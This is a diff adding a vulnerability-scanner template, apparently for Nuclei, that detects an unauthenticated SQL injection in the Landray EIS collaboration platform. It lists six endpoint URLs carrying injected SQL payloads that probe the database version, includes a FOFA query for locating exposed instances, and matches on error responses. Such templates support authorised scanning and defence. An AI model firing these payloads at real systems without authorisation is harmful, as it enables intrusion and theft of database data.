@@ -1,0 +1,37 @@
+id: landray-eis-sqli
+
+info:
+  name: Landray EIS SQL Injection
+  author: Co5mos
+  severity: critical
+  description: |
+    蓝凌EIS智慧协同平台多个接口处未对用户输入的SQL语句进行过滤或验证导致出现SQL注入漏洞，未经身份验证的攻击者可以利用此漏洞获取数据库敏感信息。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E8%93%9D%E5%87%8CEIS%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0%E5%A4%9A%E4%B8%AA%E6%8E%A5%E5%8F%A3SQL%E6%B3%A8%E5%85%A5.md
+  metadata:
+    verified: true
+    fofa-query: app="Landray-EIS智慧协同平台"
+  tags: landray, sqli
+
+http:
+  - raw:
+      - |
+        GET {{path}} HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      path:
+        - /dossier/doc_fileedit_word.aspx?recordid=1'%20and%201=@@version--+&edittype=1,1
+        - /frm/frm_form_list_main.aspx?list_id=1%20and%201=@@version--+
+        - /frm/frm_button_func.aspx?formid=1%20and%201=@@version--+
+        - /third/DingTalk/Demo/ShowUserInfo.aspx?account=1'%20and%201=@@version--+
+        - /third/DingTalk/Pages/UniformEntry.aspx?moduleid=1%20and%201=@@version--+
+        - /flow/fl_define_flow_chart_show.aspx?id=1%20and%201=@@version--+
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - contains(body, 'Microsoft SQL Server') || contains(body, 'MySQL') || contains(body, 'PostgreSQL')
+        condition: and
